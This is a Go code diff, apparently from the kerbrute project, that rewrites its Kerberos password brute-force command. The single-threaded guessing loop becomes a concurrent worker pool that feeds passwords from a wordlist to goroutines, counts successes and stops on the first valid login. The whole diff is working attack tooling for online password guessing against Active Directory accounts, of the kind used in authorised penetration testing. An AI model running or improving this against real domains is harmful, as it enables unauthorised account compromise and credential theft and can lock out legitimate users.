@@ -2,8 +2,9 @@ package cmd
 
 import (
 	"bufio"
-	"fmt"
 	"os"
+	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/ropnop/kerbrute/util"
@@ -30,11 +31,18 @@ func init() {
 
 func bruteForce(cmd *cobra.Command, args []string) {
 	passwordlist := args[0]
+	stopOnSuccess = true
 	username, err := util.FormatUsername(args[1])
 	if err != nil {
 		logger.Log.Error(err.Error())
 		return
 	}
+
+	passwordsChan := make(chan string, threads)
+	defer cancel()
+
+	var wg sync.WaitGroup
+	wg.Add(threads)
 
 	file, err := os.Open(passwordlist)
 	if err != nil {
@@ -43,29 +51,29 @@ func bruteForce(cmd *cobra.Command, args []string) {
 	}
 	defer file.Close()
 
+	for i := 0; i < threads; i++ {
+		go makeBruteWorker(ctx, passwordsChan, &wg, username)
+	}
 	scanner := bufio.NewScanner(file)
+	start := time.Now()
 
 	var password string
-	count := 0
-	start := time.Now()
+Scan:
 	for scanner.Scan() {
-		count++
-		password = scanner.Text()
-		login := fmt.Sprintf("%v@%v", username, domain)
-		if ok, err := kSession.TestLogin(username, password); ok {
-			logger.Log.Notice("[+] VALID LOGIN:\t %s : %s", login, password)
-			break
-		} else {
-			// This is to determine if the error is "okay" or if we should abort everything
-			ok, errorString := kSession.HandleKerbError(err)
-			if !ok {
-				logger.Log.Errorf("[!] %v - %v", login, errorString)
-				return
-			}
-			logger.Log.Debugf("[!] %v - %v", login, errorString)
+		select {
+		case <-ctx.Done():
+			break Scan
+		default:
+			password = scanner.Text()
+			passwordsChan <- password
 		}
 	}
-	logger.Log.Infof("Done! Tested %d passwords in %.3f seconds", count, time.Since(start).Seconds())
+	close(passwordsChan)
+	wg.Wait()
+
+	finalCount := atomic.LoadInt32(&counter)
+	finalSuccess := atomic.LoadInt32(&successes)
+	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())
 
 	if err := scanner.Err(); err != nil {
 		logger.Log.Error(err.Error())
